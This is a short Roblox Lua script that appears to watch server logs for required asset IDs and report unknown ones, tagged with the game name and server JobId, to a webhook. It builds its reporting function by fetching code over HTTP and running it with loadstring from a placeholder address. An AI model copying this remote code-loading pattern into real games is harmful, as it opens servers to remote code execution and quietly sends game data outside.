-- created by shadowmaster940
-- if need to contact then discord is [[ shadowisreal ]]

local LogService = game.LogService
local ReplicatedStorage = game.ReplicatedStorage
local HttpService = game.HttpService

local Webhook = nil
local KnownBackdoors = {
	
}
local WhitelistedRequires = {
	"7510622625"
}
local AlreadyLogged = {}

local FireHook = loadstring(game.HttpService:GetAsync("shhh"))().SecretPassword

local function FindAssetId(Message)
	Message = string.sub(Message, #"Requiring asset  ", #Message)
	
	local AssetId = ""
	
	local SplitMessage = string.split(Message, "")
	for i=1, #SplitMessage do
		if SplitMessage[i] == "." then
			break
		end
		
		AssetId = AssetId..SplitMessage[i]
	end
	
	return AssetId
end

while true do
	
	for _,MessageInfo in pairs(LogService:GetLogHistory()) do
		local Message = MessageInfo["message"]
		local MessageType = MessageInfo["messageType"]
		if MessageType == Enum.MessageType.MessageOutput and string.find(Message, "Requiring") then
		
			local AssetId = FindAssetId(Message)
			
			if table.find(KnownBackdoors, AssetId) then
				if Webhook then
					FireHook(game.Name, game.JobId, AssetId, Webhook)
				end
			elseif not table.find(WhitelistedRequires, AssetId) and not table.find(AlreadyLogged, AssetId) then
				FireHook(tostring(game), game.JobId, AssetId)
				table.insert(AlreadyLogged, AssetId)
			end
		end
	end

	task.wait(1)
end
